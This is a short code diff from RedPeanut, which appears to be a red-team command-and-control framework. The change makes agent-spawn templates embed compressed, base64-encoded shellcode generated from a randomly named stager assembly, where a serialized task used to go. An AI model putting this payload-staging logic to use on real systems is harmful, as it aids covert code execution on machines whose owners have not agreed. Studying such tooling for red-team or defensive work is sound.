@@ -146,6 +146,7 @@ namespace RedPeanut
 
                     string stagerstr = Convert.ToBase64String(CompressGZipAssembly(Builder.BuidStreamAssembly(source, RandomAString(10, new Random()) + ".dll", targetframework)));
 
+                    /*
                     ModuleConfig modconfig = new ModuleConfig
                     {
                         Assembly = stagerstr,
@@ -163,10 +164,12 @@ namespace RedPeanut
 
                     if (agent.Pivoter != null)
                         task.AgentPivot = agent.Pivoter.AgentId;
-
+*/
                     source = File.ReadAllText(Path.Combine(folderrpath, SPAWN_TEMPLATE))
-                    .Replace("#NUTCLR#", ReadResourceFile(PL_COMMAND_NUTCLRWNF))
-                    .Replace("#TASK#", Convert.ToBase64String(CompressGZipAssembly(Encoding.Default.GetBytes(JsonConvert.SerializeObject(task)))))
+                    .Replace("#NUTCLR#", Convert.ToBase64String(CompressGZipAssembly(
+                        Builder.GenerateShellcode(stagerstr, RandomAString(10, new Random()) + ".exe", "RedPeanutRP", "Execute", new string[] { "pippo" })
+                        ))
+                        )
                     .Replace("#SPAWN#", Program.GetC2Manager().GetC2Server().GetProfile(profileid).Spawn)
                     .Replace("#SHELLCODE#", null)
                     .Replace("#USERNAME#", null)
